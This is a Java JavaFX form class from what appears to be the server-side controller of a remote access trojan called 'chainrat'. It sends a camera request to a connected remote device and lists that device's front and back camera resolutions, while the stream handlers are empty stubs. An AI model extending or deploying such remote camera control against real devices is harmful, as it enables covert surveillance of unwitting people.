package com.nefi.chainrat.server.forms;

import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.ControlServer.ChainControlServer;
import com.nefi.chainrat.server.network.ControlServer.Connection;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraRequest;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
import com.sun.glass.ui.Size;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;

import java.net.URL;
import java.util.ResourceBundle;

public class frmCameraManager implements Initializable {
    public TitledPane gPaneSettings;
    public RadioButton rbFront;
    public RadioButton rbBack;
    public CheckBox cbCompression;
    public ComboBox comboSize;
    public Button btnStartStream;
    public ImageView imageView;
    public TitledPane gPaneImage;
    public Button btnStopStream;

    private Log log;
    private Connection connection;
    private ToggleGroup toggleGroup = new ToggleGroup();

    private Size[] frontSizes;
    private Size[] backSizes;

    public frmCameraManager(Connection connection){
        this.connection = connection;
       // btnStartStream.setVisible(false);
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        this.log = Main.getLog();
        this.rbFront.setToggleGroup(this.toggleGroup);
        this.rbBack.setToggleGroup(this.toggleGroup);
        //Make request
        CameraRequest cr = new CameraRequest(true, false, 640, 800);
        String packet = Main.getGson().toJson(cr, CameraRequest.class);
        ChainControlServer.writeStringToChannel(connection.channel, packet);
    }

    public void onMessageRecieved(CameraResponse packet){
        frontSizes = packet.dimensionsFront;
        backSizes = packet.dimensionsBack;

        Size[] sizes = rbFront.isSelected() ? frontSizes : backSizes;

        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                comboSize.getItems().clear();
                for(Size size : sizes){
                    comboSize.getItems().add(size.width + " x " + size.height);
                }
                comboSize.getSelectionModel().select(0);
            }
        });
    }

    public void btnStartStream_Click(ActionEvent actionEvent) {
    }



    public void btnStopStream_Click(ActionEvent actionEvent) {

    }

    public void comboSize_changed(ActionEvent actionEvent) {
    }

    public void rbChanged(ActionEvent actionEvent) {
    }
}
